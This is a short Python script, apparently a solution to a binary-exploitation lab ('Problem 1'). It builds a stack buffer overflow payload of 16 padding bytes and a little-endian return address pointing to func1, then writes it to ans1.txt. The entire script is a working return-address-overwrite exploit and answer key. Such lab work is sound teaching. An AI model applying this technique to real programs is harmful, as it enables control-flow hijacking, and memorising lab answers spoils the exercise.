import struct

# 1. 目标地址：func1 的入口地址
target_addr = 0x401216

# 2. 计算偏移量：Buffer(8) + Saved RBP(8) = 16
padding_length = 16

# 3. 构造 Payload
# b'A' * 16 用于覆盖缓冲区和旧的 RBP
# struct.pack('<Q', ...) 将地址转换为 64位小端序二进制流
payload = b'A' * padding_length + struct.pack('<Q', target_addr)

# 4. 写入文件 ans1.txt
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("[+] Payload for Problem 1 generated successfully!")